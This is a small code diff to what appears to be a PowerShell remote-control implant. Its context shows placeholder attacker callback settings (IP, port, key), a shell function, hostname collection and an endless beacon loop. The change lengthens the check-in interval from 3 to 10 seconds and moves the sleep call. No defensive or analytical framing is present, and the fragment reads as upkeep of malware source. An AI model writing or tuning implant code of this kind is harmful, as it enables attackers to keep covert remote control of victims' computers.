@@ -78,7 +78,7 @@ function shell($fname, $arg){
 $ip   = "REPLACE_IP"
 $port = "REPLACE_PORT"
 $key  = "REPLACE_KEY"
-$n    = 3
+$n    = 10
 $name = ""
 
 $hname = [System.Net.Dns]::GetHostName()
@@ -155,7 +155,6 @@ for (;;){
                 exit
             }
         }
-
-    sleep $n
     }
+    Start-Sleep $n
 }
